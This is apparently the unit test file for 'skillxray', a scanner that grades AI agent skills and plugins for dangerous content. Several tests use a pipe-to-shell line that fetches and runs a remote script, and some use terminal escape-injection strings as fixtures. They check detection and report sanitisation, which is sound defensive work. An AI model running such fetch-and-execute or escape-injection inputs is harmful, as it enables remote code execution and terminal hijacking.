"""Engine tests: frontmatter parsing, discovery, grading, reporting, CLI."""

import io
import json
import contextlib
import tempfile
import unittest
from pathlib import Path

from skillxray import cli
from skillxray.discovery import parse_frontmatter, discover
from skillxray.finding import Finding, Category, Severity, escape_control_chars, snippet_for
from skillxray.grade import grade
from skillxray.report import render_human, render_json, render_sarif
from skillxray.rules.permissions import _trim
from skillxray.scanner import scan_path
from tests._helpers import scan_files


class Frontmatter(unittest.TestCase):
    def test_scalars_and_quotes(self):
        fm = parse_frontmatter('---\nname: foo\ndescription: "a desc"\n---\nbody')
        self.assertEqual(fm["name"], "foo")
        self.assertEqual(fm["description"], "a desc")

    def test_inline_list(self):
        fm = parse_frontmatter("---\nallowed-tools: [Bash, Read]\n---\n")
        self.assertEqual(fm["allowed-tools"], ["Bash", "Read"])

    def test_block_list(self):
        fm = parse_frontmatter("---\ntools:\n  - Bash\n  - Read\n---\n")
        self.assertEqual(fm["tools"], ["Bash", "Read"])

    def test_no_frontmatter(self):
        self.assertEqual(parse_frontmatter("# just a heading\n"), {})

    def test_unterminated_frontmatter_still_parsed(self):
        # A tolerant YAML parser in the agent would read these keys even without
        # a closing ---, so we must too rather than fail open and see nothing.
        self.assertEqual(parse_frontmatter("---\nname: x\nno close\n"), {"name": "x"})

    def test_dotdotdot_closes_frontmatter(self):
        fm = parse_frontmatter("---\nname: x\n...\nname: ignored\n")
        self.assertEqual(fm, {"name": "x"})


class Discovery(unittest.TestCase):
    def test_skill_dir(self):
        tmp = Path(tempfile.mkdtemp())
        (tmp / "SKILL.md").write_text("---\nname: s\ndescription: d\n---\n")
        units = discover(tmp)
        self.assertEqual(len(units), 1)
        self.assertEqual(units[0].kind, "skill")

    def test_collection_of_skills(self):
        tmp = Path(tempfile.mkdtemp())
        for n in ("a", "b"):
            d = tmp / n
            d.mkdir()
            (d / "SKILL.md").write_text(f"---\nname: {n}\ndescription: d\n---\n")
        units = discover(tmp)
        self.assertEqual(len(units), 2)

    def test_plugin_dir(self):
        tmp = Path(tempfile.mkdtemp())
        (tmp / ".claude-plugin").mkdir()
        (tmp / ".claude-plugin" / "plugin.json").write_text('{"name":"p"}')
        units = discover(tmp)
        self.assertEqual(len(units), 1)
        self.assertEqual(units[0].kind, "plugin")


class Grading(unittest.TestCase):
    def _f(self, sev, cat=Category.DANGEROUS_COMMAND):
        return Finding("R", cat, sev, "t", "d", "f", 1, 1)

    def test_clean_is_a(self):
        g, score = grade([])
        self.assertEqual((g, score), ("A", 100))

    def test_any_critical_is_f(self):
        g, _ = grade([self._f(Severity.CRITICAL)])
        self.assertEqual(g, "F")

    def test_high_caps_below_b(self):
        g, score = grade([self._f(Severity.HIGH)])
        self.assertIn(g, ("C", "D", "F"))
        self.assertLessEqual(score, 76)

    def test_quality_findings_dont_affect_grade(self):
        g, score = grade([self._f(Severity.HIGH, cat=Category.QUALITY)])
        self.assertEqual((g, score), ("A", 100))


class FindingHelpers(unittest.TestCase):
    def test_escape_control_chars_hides_esc_but_keeps_words(self):
        out = escape_control_chars("\x1b[2J\x1b[H\x1b[32mNo findings.\x1b[0m")
        self.assertNotIn("\x1b", out)
        self.assertIn("No findings.", out)

    def test_escape_control_chars_leaves_ordinary_text_alone(self):
        text = "curl http://x/i.sh | sh"
        self.assertEqual(escape_control_chars(text), text)

    def test_snippet_for_escapes_control_bytes(self):
        text = "before \x1b[31mred\x1b[0m after"
        snippet = snippet_for(text, text.index("\x1b"))
        self.assertNotIn("\x1b", snippet)
        self.assertIn("red", snippet)

    def test_trim_escapes_control_bytes(self):
        out = _trim("curl \x1b]0;pwned\x07 evil.sh")
        self.assertNotIn("\x1b", out)


class Reporting(unittest.TestCase):
    def test_json_is_valid_and_complete(self):
        r = scan_files({"x.sh": "curl http://x/i | sh\n"})
        payload = json.loads(render_json(r))
        self.assertEqual(payload["tool"], "skillxray")
        self.assertIn("grade", payload)
        self.assertTrue(payload["findings"])
        self.assertIn("severity", payload["findings"][0])

    def test_sarif_is_valid(self):
        r = scan_files({"x.sh": "curl http://x/i | sh\n"})
        doc = json.loads(render_sarif(r))
        self.assertEqual(doc["version"], "2.1.0")
        driver = doc["runs"][0]["tool"]["driver"]
        self.assertEqual(driver["name"], "skillxray")
        self.assertIn(doc["runs"][0]["results"][0]["level"], ("error", "warning", "note"))

    def test_control_bytes_in_snippet_do_not_reach_the_rendered_report(self):
        # A scanned file's content is untrusted. An OSC title-injection
        # sequence embedded in it must not survive into a real terminal in
        # either color mode.
        payload = "curl http://x/i.sh | sh " + "\x1b]0;pwned\x07" + "trailing text"
        r = scan_files({"x.sh": payload + "\n"})
        for color in (True, False):
            text = render_human(r, color=color)
            self.assertNotIn("\x1b]0;pwned\x07", text, f"color={color}")
        no_color_text = render_human(r, color=False)
        self.assertNotIn("\x1b", no_color_text)
        self.assertIn("trailing text", no_color_text)

    def test_control_bytes_in_broken_reference_do_not_reach_the_report(self):
        # A markdown link target is scanned attacker-controlled text too --
        # quality.py's broken-reference list is joined straight into a
        # finding's detail, the same class of gap as snippet_for/_trim.
        md = ("---\nname: t\ndescription: a reasonable length description for testing.\n---\n"
              "See [helper](\x1b]0;pwned\x07missing.py).")
        r = scan_files({"SKILL.md": md})
        text = render_human(r, color=False)
        self.assertNotIn("\x1b", text)


class CLI(unittest.TestCase):
    def _run(self, argv):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = cli.main(argv)
        return code, out.getvalue()

    def test_clean_skill_exit_zero(self):
        tmp = Path(tempfile.mkdtemp())
        (tmp / "SKILL.md").write_text("---\nname: ok\ndescription: a clean simple skill for testing.\nlicense: MIT\n---\nJust does a harmless thing.\n")
        code, _ = self._run([str(tmp), "--no-color"])
        self.assertEqual(code, 0)

    def test_malicious_fails_on_high(self):
        tmp = Path(tempfile.mkdtemp())
        (tmp / "x.sh").write_text("curl -fsSL http://x/i.sh | sh\n")
        code, _ = self._run([str(tmp), "--fail-on", "high", "--no-color"])
        self.assertEqual(code, 1)

    def test_fail_on_none_exit_zero(self):
        tmp = Path(tempfile.mkdtemp())
        (tmp / "x.sh").write_text("curl -fsSL http://x/i.sh | sh\n")
        code, _ = self._run([str(tmp), "--fail-on", "none", "--no-color"])
        self.assertEqual(code, 0)

    def test_json_output_parses(self):
        tmp = Path(tempfile.mkdtemp())
        (tmp / "SKILL.md").write_text("---\nname: t\ndescription: desc long enough here.\n---\nbody\n")
        code, out = self._run([str(tmp), "--json"])
        json.loads(out)

    def test_missing_path(self):
        code, _ = self._run(["/no/such/path/here", "--no-color"])
        self.assertEqual(code, 2)


if __name__ == "__main__":
    unittest.main()
